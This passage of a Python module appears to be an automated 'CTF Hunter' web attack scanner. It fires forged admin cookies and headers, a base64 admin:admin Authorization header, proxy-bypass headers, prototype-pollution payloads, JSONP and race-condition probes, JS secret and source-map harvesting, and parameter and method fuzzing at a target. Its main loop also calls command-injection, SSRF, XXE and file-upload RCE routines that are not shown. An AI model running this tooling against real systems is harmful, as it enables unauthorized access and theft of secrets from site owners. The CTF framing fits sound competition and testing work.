                findings.append(_flag_finding(flag, f"PHP type juggling login bypass", url, f"payload={payload}"))
            # Check for redirect to admin or token in response
            if any(kw in body.lower() for kw in ["welcome", "dashboard", "token", "success"]):
                findings.append(Finding(
                    type="type_juggling",
                    title=f"PHP type juggling bypass: {ep}",
                    severity="high",
                    description=f"Type juggling bypassed login.\nPayload: {payload}\n{body[:300]}",
                    evidence=f"url={url} payload={payload}",
                    cvss_score=8.1,
                ))

    return findings


# ── Technique Q: Cookie/Header manipulation ───────────────────────────────────

_ADMIN_COOKIES = [
    {"admin": "true", "role": "admin", "isAdmin": "1"},
    {"user": "admin", "auth": "true", "is_admin": "true"},
    {"session": "admin", "privilege": "admin"},
    {"access": "admin"},
]

_ADMIN_HEADERS = [
    {"X-Admin": "true"},
    {"X-Role": "admin"},
    {"X-User": "admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
]


def _tech_q_cookie_header(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    target_eps = ["/flag", "/admin", "/api/flag", "/api/admin", "/secret", "/dashboard"]

    for ep in target_eps:
        url = base + ep
        for cookie_dict in _ADMIN_COOKIES:
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
            _, body, _ = _get(url, timeout=6, headers={"Cookie": cookie_str})
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"Cookie manipulation", url, f"cookies={cookie_dict}"))

        for header_dict in _ADMIN_HEADERS:
            _, body, _ = _get(url, timeout=6, headers=header_dict)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"Header manipulation", url, f"headers={header_dict}"))

    return findings


# ── Technique R: Error pages / stack traces ───────────────────────────────────

_ERROR_TRIGGERS = [
    "?id='", "?id=<script>", "?id=../", "?foo=bar&foo=baz",
    "?id=-1", "?id=0", "?id=null", "?id=undefined", "?id=NaN",
    "?id={}",
]


def _tech_r_error_pages(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    for ep in ["/", "/api", "/api/v1", "/api/v2"]:
        url = base + ep
        for trigger in _ERROR_TRIGGERS:
            _, body, _ = _get(url + trigger, timeout=6)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, "Error page / stack trace", url + trigger))

    # Try different HTTP methods on known paths
    for ep in ["/flag", "/admin", "/api/flag", "/secret"]:
        url = base + ep
        for method in ["PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]:
            try:
                with _client(6) as c:
                    r = c.request(method, url)
                    flags = search_flags_decoded(r.text, pattern)
                    for flag in flags:
                        findings.append(_flag_finding(flag, f"HTTP method {method}", url))
            except Exception:
                pass

    return findings


# ── Technique S: WebSocket probe ──────────────────────────────────────────────

async def _tech_s_websocket(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    ws_urls: list[str] = []

    ws_base = base.replace("https://", "wss://").replace("http://", "ws://")
    for ep in ["/ws", "/websocket", "/socket", "/chat", "/live", "/events", "/api/ws"]:
        ws_urls.append(ws_base + ep)

    # Find ws:// or wss:// in page source
    for f in all_findings:
        for m in re.finditer(r"wss?://[^\s\"'<>]+", (f.evidence or "") + (f.description or "")):
            ws_urls.append(m.group(0))

    for ws_url in list(dict.fromkeys(ws_urls))[:5]:
        try:
            import websockets  # type: ignore
            async with websockets.connect(ws_url, open_timeout=5, close_timeout=3) as ws:
                for msg in ['{"type":"flag"}', '{"action":"getFlag"}', '"flag"', "flag", "get_flag"]:
                    await ws.send(msg)
                    try:
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        flags = search_flags_decoded(str(resp), pattern)
                        for flag in flags:
                            findings.append(_flag_finding(flag, "WebSocket probe", ws_url, f"msg={msg}"))
                    except asyncio.TimeoutError:
                        pass
        except Exception:
            pass

    return findings


# ── Technique T: Prototype pollution ─────────────────────────────────────────

_PROTO_PAYLOADS = [
    {"__proto__": {"admin": True, "isAdmin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__[admin]": "true"},
]


def _tech_t_prototype_pollution(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    target_eps = ["/api/user", "/api/profile", "/api/settings", "/api/update"]

    for ep in target_eps:
        url = base + ep
        for payload in _PROTO_PAYLOADS:
            _, body, _ = _post(url, json_body=payload, timeout=6)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, "Prototype pollution", url, f"payload={payload}"))

    # URL param based
    for ep in ["/api/flag", "/admin", "/api/admin"]:
        _, body, _ = _get(base + ep + "?__proto__[admin]=true", timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "Prototype pollution URL param", base + ep))

    return findings


# ── Technique U: JSONP hijacking ──────────────────────────────────────────────

def _tech_u_jsonp(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    callback_re = re.compile(r"https?://[^\s\"'<>]+callback=[^\s\"'<>]+", re.I)

    jsonp_urls: list[str] = []
    for f in all_findings:
        for m in callback_re.finditer((f.evidence or "") + " " + (f.description or "")):
            jsonp_urls.append(m.group(0))

    # Probe known JSONP endpoints
    for ep in ["/api/user", "/api/data", "/api/profile"]:
        for cb_param in ["callback", "cb", "jsonp", "func"]:
            url = f"{base}{ep}?{cb_param}=flag_callback"
            _, body, _ = _get(url, timeout=6)
            if "flag_callback" in body:
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"JSONP hijacking ({cb_param})", url))

    for url in jsonp_urls[:5]:
        _, body, _ = _get(url, timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "JSONP endpoint", url))

    return findings


# ── Technique V: Race condition ───────────────────────────────────────────────

async def _tech_v_race(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    race_endpoints = ["/api/flag", "/redeem", "/coupon", "/vote", "/submit"]

    async def _async_get(url: str) -> tuple[int, str]:
        try:
            async with httpx.AsyncClient(verify=False, timeout=8) as c:
                r = await c.get(url)
                return r.status_code, r.text
        except Exception:
            return 0, ""

    for ep in race_endpoints:
        url = base + ep
        tasks = [_async_get(url) for _ in range(10)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, tuple):
                _, body = result
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, "Race condition", url))

    return findings


# ── Technique W: JS source analysis ──────────────────────────────────────────

_JS_SECRET_RE = re.compile(
    r"(?:flag|secret|key|token|api[_-]?key|password|passwd|auth|bearer)\s*[:=]\s*[\"']([^\"']{4,200})[\"']",
    re.I,
)
_JS_URL_RE = re.compile(r"(?:fetch|axios\.get|\.get|\.post|url\s*[:=])\s*[\"']([/][^\"']{2,200})[\"']", re.I)
_SOURCE_MAP_RE = re.compile(r"//# sourceMappingURL=([^\s]+\.map)")


def _tech_w_js_analysis(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    js_urls: list[str] = []

    # Collect JS URLs from findings
    for f in all_findings:
        for m in re.finditer(r"https?://[^\s\"'<>]+\.js(?:\?[^\s\"'<>]*)?", (f.evidence or "") + " " + (f.description or "")):
            js_urls.append(m.group(0))

    # Probe main page for JS links
    _, main_body, _ = _get(base + "/", timeout=8)
    for m in re.finditer(r'(?:src|href)=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', main_body, re.I):
        path = m.group(1)
        if path.startswith("http"):
            js_urls.append(path)
        else:
            js_urls.append(base + path if path.startswith("/") else base + "/" + path)

    js_urls = list(dict.fromkeys(js_urls))[:20]

    hidden_endpoints: set[str] = set()

    for js_url in js_urls:
        _, js_body, _ = _get(js_url, timeout=10)
        if not js_body:
            continue

        # Search for flags directly in JS
        flags = search_flags_decoded(js_body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "JS source code", js_url))

        # Search for hardcoded secrets
        for m in _JS_SECRET_RE.finditer(js_body):
            val = m.group(1)
            flags2 = extract_flags(val, pattern)
            for flag in flags2:
                findings.append(_flag_finding(flag, "JS hardcoded secret", js_url, f"key={m.group(0)[:60]}"))
            if not flags2:
                findings.append(Finding(
                    type="secret_leak",
                    title=f"Hardcoded secret in JS: {js_url[-60:]}",
                    severity="high",
                    description=f"Potential secret found in JS source: {m.group(0)[:100]}",
                    evidence=f"url={js_url} match={m.group(0)[:100]}",
                    cvss_score=7.5,
                ))

        # Extract hidden API endpoints from JS
        for m in _JS_URL_RE.finditer(js_body):
            hidden_endpoints.add(m.group(1))

        # Check for source map
        for m in _SOURCE_MAP_RE.finditer(js_body):
            map_path = m.group(1)
            map_url = map_path if map_path.startswith("http") else base + "/" + map_path.lstrip("/")
            _, map_body, _ = _get(map_url, timeout=8)
            if map_body:
                flags3 = search_flags_decoded(map_body, pattern)
                for flag in flags3:
                    findings.append(_flag_finding(flag, "JS source map", map_url))
                # sourcesContent may have full source
                try:
                    smap = json.loads(map_body)
                    for src in (smap.get("sourcesContent") or []):
                        flags4 = extract_flags(src or "", pattern)
                        for flag in flags4:
                            findings.append(_flag_finding(flag, "JS source map content", map_url))
                except Exception:
                    pass

    # Probe discovered hidden endpoints
    for ep in list(hidden_endpoints)[:30]:
        url = base + ep if ep.startswith("/") else base + "/" + ep
        _, body, _ = _get(url, timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, f"Hidden JS endpoint {ep}", url))

    return findings


# ── Technique X: Full page crawler ───────────────────────────────────────────

def _tech_x_crawler(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    visited: set[str] = set()
    queue: list[str] = [base + "/"]
    link_re = re.compile(r'(?:href|src|action)=["\']([^"\'#]{2,300})["\']', re.I)
    depth = 0
    max_pages = 80

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)

        _, body, _ = _get(url, timeout=8)
        if not body:
            continue

        # Check for flags
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "Page crawler", url))

        # Extract links (only same host)
        for m in link_re.finditer(body):
            link = m.group(1)
            if link.startswith("http"):
                if urlparse(link).netloc == urlparse(base).netloc:
                    if link not in visited:
                        queue.append(link)
            elif link.startswith("/"):
                full = base + link
                if full not in visited:
                    queue.append(full)

    return findings


# ── Technique Y: API versioning + param fuzzing ───────────────────────────────

_API_VERSIONS = ["/api/v0", "/api/v1", "/api/v2", "/api/v3", "/api/internal",
                 "/api/dev", "/api/debug", "/api/admin", "/api/private", "/v1", "/v2", "/v3"]
_HIDDEN_PARAMS = ["debug", "test", "admin", "flag", "secret", "key", "token",
                  "internal", "dev", "preview", "raw", "export", "dump", "show"]


def _tech_y_api_fuzz(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []

    # API version fuzzing
    for ver in _API_VERSIONS:
        url = base + ver
        _, body, _ = _get(url, timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, f"API version probe {ver}", url))

    # Endpoint + hidden param fuzzing
    endpoints: list[str] = [base + "/api"]
    for f in all_findings:
        for m in re.finditer(r"https?://[^\s\"'<>]+", (f.evidence or "")):
            endpoints.append(m.group(0).split("?")[0])

    for ep in list(dict.fromkeys(endpoints))[:15]:
        for param in _HIDDEN_PARAMS:
            for val in ["true", "1", "yes", "admin", ""]:
                url = f"{ep}?{param}={val}"
                _, body, _ = _get(url, timeout=5)
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"Hidden param ?{param}={val}", url))


    # HTTP method fuzzing on each found endpoint
    for f in all_findings:
        for m in re.finditer(r"https?://[^\s\"'<>]+", (f.evidence or "")):
            ep_url = m.group(0).split("?")[0]
            for method in ["PUT", "DELETE", "PATCH", "OPTIONS"]:
                try:
                    with _client(5) as c:
                        r = c.request(method, ep_url)
                        flags = search_flags_decoded(r.text, pattern)
                        for flag in flags:
                            findings.append(_flag_finding(flag, f"HTTP {method} on {ep_url[-60:]}", ep_url))
                except Exception:
                    pass

    return findings


# ── Main entry point ──────────────────────────────────────────────────────────

async def run_ctf_hunter(
    ctx: "ScanContext",
    target: str,
    ctf_flag_format: str | None,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()
    pattern = build_flag_pattern(ctf_flag_format)
    base = _base_url(target)

    techniques = [
        ("ctf_paths",         "A: Common CTF paths",         lambda: _tech_a_paths(base, pattern)),
        ("git_recon",         "B: .git reconstruction",       lambda: _tech_b_git(base, pattern)),
        ("jwt_attack",        "C: JWT attack",                lambda: _tech_c_jwt(base, pattern, all_findings)),
        ("idor_enum",         "D: IDOR enumeration",          lambda: _tech_d_idor(base, pattern, all_findings)),
        ("ssti_probe",        "E: SSTI inline probe",         lambda: _tech_e_ssti(base, pattern, all_findings)),
        ("xxe_probe",         "F: XXE injection",             lambda: _tech_f_xxe(base, pattern, all_findings)),
        ("ssrf_probe",        "G: SSRF probe",                lambda: _tech_g_ssrf(base, pattern, all_findings)),
        ("cmdi_probe",        "H: Command injection",         lambda: _tech_h_cmdi(base, pattern, all_findings)),
        ("nosql_injection",   "I: NoSQL injection",           lambda: _tech_i_nosql(base, pattern)),
        ("graphql_probe",     "J: GraphQL introspection",     lambda: _tech_j_graphql(base, pattern)),
        ("file_upload",       "K: File upload RCE",           lambda: _tech_k_upload(base, pattern, all_findings)),
        ("mass_assign",       "L: Mass assignment",           lambda: _tech_l_mass_assign(base, pattern, all_findings)),
        ("path_bypass",       "M: Path normalization bypass", lambda: _tech_m_path_bypass(base, pattern)),
        ("server_misconfig",  "N: Server misconfig traversal",lambda: _tech_n_server_misconfig(base, pattern)),
        ("debug_expose",      "O: Debug/console exposure",    lambda: _tech_o_debug(base, pattern)),
        ("type_juggling",     "P: PHP type juggling",         lambda: _tech_p_type_juggling(base, pattern)),
        ("cookie_manip",      "Q: Cookie/header manipulation",lambda: _tech_q_cookie_header(base, pattern)),
        ("error_pages",       "R: Error pages / stack trace", lambda: _tech_r_error_pages(base, pattern)),
        ("mass_assign2",      "T: Prototype pollution",       lambda: _tech_t_prototype_pollution(base, pattern)),
        ("jsonp_hijack",      "U: JSONP hijacking",           lambda: _tech_u_jsonp(base, pattern, all_findings)),
        ("js_analysis",       "W: JS source analysis",        lambda: _tech_w_js_analysis(base, pattern, all_findings)),
        ("page_crawler",      "X: Full page crawler",         lambda: _tech_x_crawler(base, pattern)),
        ("api_fuzz",          "Y: API versioning + param fuzz",lambda: _tech_y_api_fuzz(base, pattern, all_findings)),
    ]

    for phase_key, label, tech_fn in techniques:
        await ctx.set_phase(f"ctf_{phase_key}")
        await ctx.log(f"CTF Hunter → {label}", module="ctf_hunter")
        try:
            tech_findings = tech_fn()
            if tech_findings:
                flags_found = [f for f in tech_findings if f.type == "flag"]
                result.findings.extend(tech_findings)
                if flags_found:
                    await ctx.log(
                        f"  ★ FLAG FOUND via {label}: {flags_found[0].title}",
                        level="success", module="ctf_hunter",
                    )
        except Exception as exc:
            await ctx.log(f"  {label} error: {exc}", level="warning", module="ctf_hunter")

    # Async techniques (WebSocket, race condition)
    await ctx.set_phase("ctf_websocket")
    await ctx.log("CTF Hunter → S: WebSocket probe", module="ctf_hunter")
    try:
        ws_findings = await _tech_s_websocket(base, pattern, all_findings)
        result.findings.extend(ws_findings)
    except Exception as exc:
        await ctx.log(f"  WebSocket error: {exc}", level="warning", module="ctf_hunter")

    await ctx.set_phase("ctf_race")
    await ctx.log("CTF Hunter → V: Race condition", module="ctf_hunter")
    try:
        race_findings = await _tech_v_race(base, pattern)
        result.findings.extend(race_findings)
    except Exception as exc:
        await ctx.log(f"  Race condition error: {exc}", level="warning", module="ctf_hunter")

    total_flags = sum(1 for f in result.findings if f.type == "flag")
    await ctx.log(
        f"CTF Hunter complete: {total_flags} flag(s) found, {len(result.findings)} total findings",
        level="success" if total_flags else "info",
        module="ctf_hunter",
    )

    return result
